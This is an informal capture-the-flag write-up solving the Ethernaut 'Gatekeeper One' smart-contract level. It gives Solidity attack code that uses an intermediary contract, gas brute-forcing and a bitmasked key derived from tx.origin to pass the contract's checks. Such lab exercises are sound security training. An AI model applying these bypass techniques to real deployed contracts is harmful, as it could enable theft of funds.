#GATEKEEPER ONE
gate one:

create an intermediatory contract that makes function calls to gatekeeper one, in order  make sure msg.sender and tx.origin are different. the caller's address would be tx.origin

gate two:
here we can bruteforce the function and increment the gas in each function call until one of the values hits the spot. 

gate three:
can be solved using data type conversion and bitmasking.

##exploit:

crafting the key :
        bytes8 gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    GatekeeperOne target;

    constructor(GatekeeperOne _target) {
        target = _target;
    }

    function hack(uint256 gas) external {
        uint64 uintKey = uint64(uint160(address(msg.sender)));
        bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF;

        (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));
        require(sent, "Transaction failed");
    }
}
```
finding the gas amount manually 
```
function tryEnter(uint256 gasOffset) public {
    bytes8 gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
    gatekeeper.call{gas: 8191 * 3 + gasOffset}(abi.encodeWithSignature("enter(bytes8)", gateKey));
}
```
calltryEnter("enter digits untill the transaction doesnt revert)

##takeaways:
how to do data type downcasting and upcasting along with bitmasking. 


